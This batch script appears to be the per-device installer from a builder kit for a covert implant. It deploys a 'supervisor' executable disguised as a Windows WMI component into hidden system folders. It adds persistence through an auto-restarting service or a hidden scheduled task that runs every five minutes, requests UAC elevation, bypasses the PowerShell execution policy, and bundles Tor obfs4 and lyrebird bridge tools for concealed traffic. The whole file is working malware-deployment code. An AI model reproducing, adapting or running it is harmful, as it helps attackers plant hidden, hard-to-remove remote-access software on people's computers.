@echo off
REM deploy.bat â€” install the supervisor as a Windows service (admin path) with
REM user-mode scheduled-task fallback when admin is unavailable.
REM The GUI fills the EDIT block per device before writing this to the output folder.
setlocal enabledelayedexpansion

REM ================= EDIT (per device; the GUI fills these) =================
set "INSTALLNAME=WMIProviderHost"
set "DISPLAYNAME=WMI Performance Adapter Extension"
set "SUPERVISOR_EXE=WmiPrvSE_worker.exe"
REM Service NAME must match service_name() in the stamped binary.
set "SVCNAME=WmiApSrvExtended"
REM =========================================================================

REM Paths derived from the EDIT block (not filled by the GUI).
set "USER_DIR=%LOCALAPPDATA%\Microsoft\%INSTALLNAME%"
set "TASK_NAME=%SVCNAME%"

REM -------------------------------------------------------------------------
REM Step 1: are we already elevated?
REM -------------------------------------------------------------------------
net session >nul 2>&1
if %errorlevel% == 0 goto :ADMIN_INSTALL

REM -------------------------------------------------------------------------
REM Step 2: not elevated â€” is this account in the local Administrators group?
REM         Determines UAC consent prompt vs. credential prompt (or no hope).
REM -------------------------------------------------------------------------
whoami /groups 2>nul | find "S-1-5-32-544" >nul 2>&1
if %errorlevel% neq 0 goto :USER_INSTALL

REM -------------------------------------------------------------------------
REM Step 3: admin account â€” request UAC elevation and wait.
REM         If the user declines or the prompt errors, fall back to user-mode.
REM -------------------------------------------------------------------------
set "PS_ELEV=%TEMP%\kp_elev_%RANDOM%.ps1"
(
echo try {
echo   $p = Start-Process -FilePath '%~f0' -Verb RunAs -PassThru -Wait
echo   exit $p.ExitCode
echo } catch {
echo   exit 1
echo }
) > "%PS_ELEV%"
powershell -ExecutionPolicy Bypass -NoProfile -File "%PS_ELEV%"
set "ELEV_RESULT=%errorlevel%"
del "%PS_ELEV%" 2>nul
if "%ELEV_RESULT%"=="0" exit /b 0
REM Elevation declined or failed â€” fall through to user-mode.

REM =========================================================================
REM USER-MODE PATH  (no admin; installs for the current user only)
REM =========================================================================
:USER_INSTALL
if not exist "%USER_DIR%" mkdir "%USER_DIR%" 2>nul
attrib +h "%USER_DIR%" >nul 2>&1

REM Copy supervisor + supporting files.
copy /Y "%~dp0%SUPERVISOR_EXE%" "%USER_DIR%\" >nul
for %%F in (lyrebird.exe obfs4proxy.exe bridges.txt) do (
  if exist "%~dp0%%F" copy /Y "%~dp0%%F" "%USER_DIR%\" >nul
)
for %%F in ("%~dp0*.exe") do (
  if /I not "%%~nxF"=="%SUPERVISOR_EXE%" if /I not "%%~nxF"=="lyrebird.exe" if /I not "%%~nxF"=="obfs4proxy.exe" copy /Y "%%~fF" "%USER_DIR%\" >nul
)

REM Create scheduled task: fires at logon + repeats every 5 min as watchdog.
REM IgnoreNew means a second trigger won't start a second copy if already running.
set "PS_TASK=%TEMP%\kp_task_%RANDOM%.ps1"
(
echo $exe  = '%USER_DIR%\%SUPERVISOR_EXE%'
echo $task = '%TASK_NAME%'
echo $action = New-ScheduledTaskAction -Execute $exe
echo $t1 = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
echo $t2 = New-ScheduledTaskTrigger -Once -At "2000-01-01" -RepetitionInterval ^(New-TimeSpan -Minutes 5^) -RepetitionDuration ^(New-TimeSpan -Days 9999^)
echo $s  = New-ScheduledTaskSettingsSet -MultipleInstances IgnoreNew -ExecutionTimeLimit ^([TimeSpan]::Zero^) -Hidden
echo Unregister-ScheduledTask -TaskName $task -Confirm:$false -ErrorAction SilentlyContinue
echo Register-ScheduledTask -TaskName $task -Action $action -Trigger $t1,$t2 -Settings $s -RunLevel Limited -Force ^| Out-Null
) > "%PS_TASK%"
powershell -ExecutionPolicy Bypass -NoProfile -File "%PS_TASK%"
del "%PS_TASK%" 2>nul

REM Start immediately (foreground mode â€” no SCM needed).
start "" /b "%USER_DIR%\%SUPERVISOR_EXE%"
exit /b 0

REM =========================================================================
REM ADMIN PATH  (runs in the UAC-elevated process)
REM =========================================================================
:ADMIN_INSTALL
REM Pick the first ProgramData path that can be created.
set "INSTALLDIR="
for %%D in ("%ProgramData%\Microsoft\%INSTALLNAME%" "%ProgramData%\%INSTALLNAME%" "%ALLUSERSPROFILE%\%INSTALLNAME%") do (
  if not defined INSTALLDIR (
    mkdir "%%~D" >nul 2>&1
    if exist "%%~D" set "INSTALLDIR=%%~D"
  )
)
if not defined INSTALLDIR ( echo ERROR: could not create install directory. & timeout /t 5 & exit /b 1 )
attrib +h +s "%INSTALLDIR%" >nul 2>&1

REM Copy supervisor + supporting files.
copy /Y "%~dp0%SUPERVISOR_EXE%" "%INSTALLDIR%\" >nul
for %%F in (lyrebird.exe obfs4proxy.exe bridges.txt) do (
  if exist "%~dp0%%F" copy /Y "%~dp0%%F" "%INSTALLDIR%\" >nul
)
for %%F in ("%~dp0*.exe") do (
  if /I not "%%~nxF"=="%SUPERVISOR_EXE%" if /I not "%%~nxF"=="lyrebird.exe" if /I not "%%~nxF"=="obfs4proxy.exe" copy /Y "%%~fF" "%INSTALLDIR%\" >nul
)

REM (Re)install the service.
sc query "%SVCNAME%" >nul 2>&1
if not errorlevel 1 (
  sc stop "%SVCNAME%" >nul 2>&1
  timeout /t 2 /nobreak >nul
  sc delete "%SVCNAME%" >nul 2>&1
  timeout /t 2 /nobreak >nul
)
sc create "%SVCNAME%" binPath= "\"%INSTALLDIR%\%SUPERVISOR_EXE%\" --run-service" start= auto DisplayName= "%DISPLAYNAME%"
if errorlevel 1 ( echo ERROR: sc create failed. & timeout /t 5 & exit /b 1 )
sc description "%SVCNAME%" "%DISPLAYNAME%" >nul
sc failure "%SVCNAME%" reset= 86400 actions= restart/5000/restart/5000/restart/5000 >nul
sc start "%SVCNAME%"

echo.
echo Done. Service '%SVCNAME%' installed to "%INSTALLDIR%" and started.
timeout /t 5
exit /b 0
